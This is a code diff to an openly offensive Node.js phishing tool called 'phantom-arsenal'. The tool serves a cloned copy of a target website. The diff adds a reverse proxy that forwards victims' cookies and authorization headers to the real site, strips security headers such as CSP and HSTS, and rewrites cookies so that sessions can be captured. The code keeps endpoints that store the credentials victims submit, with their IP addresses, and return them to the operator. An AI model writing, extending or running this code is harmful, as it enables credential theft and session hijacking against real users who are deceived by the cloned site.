@@ -350,19 +350,79 @@ const WS_PORT = await freePort(PORT+1)
 const { html, finalUrl } = await scrapeAndClone(targetUrl, WS_PORT)
 startWS(WS_PORT)
 
+// ── Reverse proxy to real server ─────────────────────────────────────────────
+function doProxy(req, res, targetOrigin) {
+  let fullUrl
+  try { fullUrl = new URL(req.url, targetOrigin).href } catch { res.writeHead(400); return res.end() }
+  let parsed; try { parsed = new URL(fullUrl) } catch { res.writeHead(400); return res.end() }
+  const mod2 = parsed.protocol === 'https:' ? https : http
+  const hdrs = {
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
+    'accept': req.headers['accept']||'*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'host': parsed.hostname,
+    'origin': parsed.origin,
+    'referer': parsed.origin+'/',
+  }
+  if (req.headers['content-type']) hdrs['content-type'] = req.headers['content-type']
+  if (req.headers['authorization']) hdrs['authorization'] = req.headers['authorization']
+  if (req.headers['cookie']) hdrs['cookie'] = req.headers['cookie']
+  const pReq = mod2.request({
+    hostname: parsed.hostname,
+    port: parsed.port||(parsed.protocol==='https:'?443:80),
+    path: parsed.pathname+parsed.search,
+    method: req.method, headers: hdrs, timeout: 15000
+  }, pRes => {
+    const rh = {}
+    for (const [k,v] of Object.entries(pRes.headers)) {
+      if (['content-encoding','transfer-encoding'].includes(k)) continue
+      rh[k]=v
+    }
+    rh['access-control-allow-origin']='*'
+    rh['access-control-allow-credentials']='true'
+    delete rh['content-security-policy']
+    delete rh['x-frame-options']
+    delete rh['strict-transport-security']
+    if (rh['set-cookie']) {
+      const c=Array.isArray(rh['set-cookie'])?rh['set-cookie']:[rh['set-cookie']]
+      rh['set-cookie']=c.map(x=>x.replace(/;\s*domain=[^;]*/gi,'').replace(/;\s*secure/gi,''))
+    }
+    res.writeHead(pRes.statusCode, rh)
+    pRes.pipe(res)
+  })
+  pReq.on('error', ()=>{ try{res.writeHead(502);res.end()}catch{} })
+  pReq.on('timeout', ()=>{ pReq.destroy(); try{res.writeHead(504);res.end()}catch{} })
+  req.pipe(pReq)
+}
+
+const targetOrigin = new URL(finalUrl).origin
+
 createServer((req,res)=>{
-  const p=decodeURIComponent(new URL(req.url,'http://x').pathname)
-  if(p==='/'){const b=Buffer.from(html,'utf8');res.writeHead(200,{'Content-Type':'text/html;charset=utf-8','Content-Length':b.length});res.end(b)}
-  else if(p.startsWith('/assets/')){const fname=p.slice(8),fpath=path.join(CACHE_DIR,fname);if(fs.existsSync(fpath)){const data=fs.readFileSync(fpath);res.writeHead(200,{'Content-Type':ctForFile(fname),'Cache-Control':'max-age=86400','Access-Control-Allow-Origin':'*'});res.end(data)}else{res.writeHead(404);res.end()}}
-  else if(p==='/creds'){let b='[]';try{b=fs.readFileSync(CREDS_FILE,'utf8')}catch{};res.writeHead(200,{'Content-Type':'application/json'});res.end(b)}
-  else if(p==='/harvest'&&req.method==='POST'){let body='';req.on('data',c=>body+=c);req.on('end',()=>{let data;try{data=JSON.parse(body)}catch{data=Object.fromEntries(new URLSearchParams(body))};saveCred(req.socket.remoteAddress||'?',data,finalUrl);res.writeHead(200,{'Content-Type':'application/json'});res.end('{"ok":true}')})}
-  else{res.writeHead(404);res.end()}
+  const reqUrl = new URL(req.url,'http://x')
+  const p = decodeURIComponent(reqUrl.pathname)
+
+  if (req.method==='OPTIONS') {
+    res.writeHead(204,{'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,POST,PUT,DELETE,OPTIONS','Access-Control-Allow-Headers':'Content-Type,Authorization,X-Requested-With'})
+    return res.end()
+  }
+
+  if(p==='/'){const b=Buffer.from(html,'utf8');res.writeHead(200,{'Content-Type':'text/html;charset=utf-8','Content-Length':b.length});return res.end(b)}
+  if(p.startsWith('/assets/')){const fname=p.slice(8),fpath=path.join(CACHE_DIR,fname);if(fs.existsSync(fpath)){const data=fs.readFileSync(fpath);res.writeHead(200,{'Content-Type':ctForFile(fname),'Cache-Control':'max-age=86400','Access-Control-Allow-Origin':'*'});return res.end(data)}res.writeHead(404);return res.end()}
+  if(p==='/creds'){let b='[]';try{b=fs.readFileSync(CREDS_FILE,'utf8')}catch{};res.writeHead(200,{'Content-Type':'application/json'});return res.end(b)}
+  if(p==='/harvest'&&req.method==='POST'){let body='';req.on('data',c=>body+=c);req.on('end',()=>{let data;try{data=JSON.parse(body)}catch{data=Object.fromEntries(new URLSearchParams(body))};saveCred(req.socket.remoteAddress||'?',data,finalUrl);res.writeHead(200,{'Content-Type':'application/json','Access-Control-Allow-Origin':'*'});res.end('{"ok":true}')});return}
+
+  // everything else → proxy to real server
+  doProxy(req, res, targetOrigin)
+
 }).listen(PORT,()=>{
-  console.log('\n\x1b[96m[+] WebSocket  : ws://0.0.0.0:'+WS_PORT)
-  console.log('[+] Phishing   : \x1b[92mhttp://0.0.0.0:'+PORT+'\x1b[0m')
-  console.log('\x1b[96m[+] Creds      : http://0.0.0.0:'+PORT+'/creds')
-  console.log('[+] Cache dir  : '+path.resolve(CACHE_DIR))
-  console.log('\x1b[93m[*] 100% offline — zero external requests\x1b[0m\n')
+  console.log('\n\x1b[96m╔══════════════════════════════════════════╗')
+  console.log('║  phantom-arsenal v11.0 — HYBRID MODE   ║')
+  console.log('╠══════════════════════════════════════════╣')
+  console.log('║  Phishing : \x1b[92mhttp://0.0.0.0:'+PORT+'\x1b[96m        ║')
+  console.log('║  WebSocket: ws://0.0.0.0:'+WS_PORT+'         ║')
+  console.log('║  Creds    : /creds                       ║')
+  console.log('╚══════════════════════════════════════════╝\x1b[0m')
+  console.log('\x1b[93m[*] Static=local  API=proxied  ✓\x1b[0m\n')
 })
 
 process.on('SIGINT',()=>{
